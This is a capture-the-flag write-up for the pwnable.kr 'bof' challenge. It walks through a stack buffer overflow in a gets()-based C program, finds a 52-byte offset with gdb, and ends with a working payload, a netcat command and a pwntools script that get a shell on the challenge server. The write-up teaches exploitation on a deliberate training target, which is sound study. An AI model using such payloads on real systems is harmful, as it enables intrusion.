pwnable.kr - bof writeup

  2020-02-19

Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

Download : http://pwnable.kr/bin/bof Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

Solution:

We get the files and run the executable bof

 1$./bof
 2overflow me : 
 3AAAAAAAAAAAAAAAAAAAAAAAAAAA
 4Nah..
 5$./bof
 6overflow me : 
 7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 8Nah..
 9*** stack smashing detected ***: ./bof terminated
10Aborted

The program asks for an input and on bufferoverflow, it detects stack smashing. We have a look at the source code bof.c

 1#include <stdio.h>
 2#include <string.h>
 3#include <stdlib.h>
 4void func(int key){
 5        char overflowme[32];
 6        printf("overflow me : ");
 7        gets(overflowme);       // smash me!
 8        if(key == 0xcafebabe){
 9                system("/bin/sh");
10        }
11        else{
12                printf("Nah..\n");
13        }
14}
15int main(int argc, char* argv[]){
16        func(0xdeadbeef);
17        return 0;
18}

We are interested in the function func. It is called with the argument 0xdeadbeef. It takes the user input using the vulnerable gets function and writes the input to the variable overflowme which we are to smash as the code says. If the argument value key is equal to 0xcafebabe, we get a shell.

So, we have to overwrite the passed variable key to the function func with 0xcafebabe. We use gdb to find the location of the variable in memory and overwrite using using basic buffer overflow.

Initially, we run the program with a few “A"s stored in a file payload in the same directory

$python -c "print('A'*32)" > payload

Now, we open the program in gdb and set breakpoint at function func and run with input from the file payload

Examining the stack, we observe that our input is stored starting from the address 0xffffd0fc and the function argument 0xdeadbeef is stored at address 0xffffd130, which we need to override with 0xcafebabe

We need to figure out the length of our padding in order to overwrite the value at address 0xffffd130. We can find this easily in python , subtractin the addresses

1>>> 0xffffd130-0xffffd0fc
252

So, we need a padding of size 52, and then we insert the required value in reverse order to overwrite the argument.

Now, we create our new payload and run the program again

1$python -c "print('A'*52 + '\xbe\xba\xfe\xca')" > payload

Examinng the stack, we see that we have correctly overwritten the value at 0xffffd130 with our desired value 0xcafebabe.

Now we supply our payload to the program running on the server

 1$(cat payload; cat) | nc pwnable.kr 9000
 2whoami
 3bof
 4ls
 5bof
 6bof.c

 8log
 9log2

11cat flag

We see that we got a shell on the server. We use cat to hold the shell. We can now easily cat the flag!

We can use a simple python script to get the flag for us:

 1#! /usr/bin/python2
 2
 3# exploit.py
 4
 5from pwn import *
 6
 7payload = 'A'*52 + '\xbe\xba\xfe\xca'
 8shell = remote('pwnable.kr', 9000)
 9shell.send(payload)
10shell.interactive()
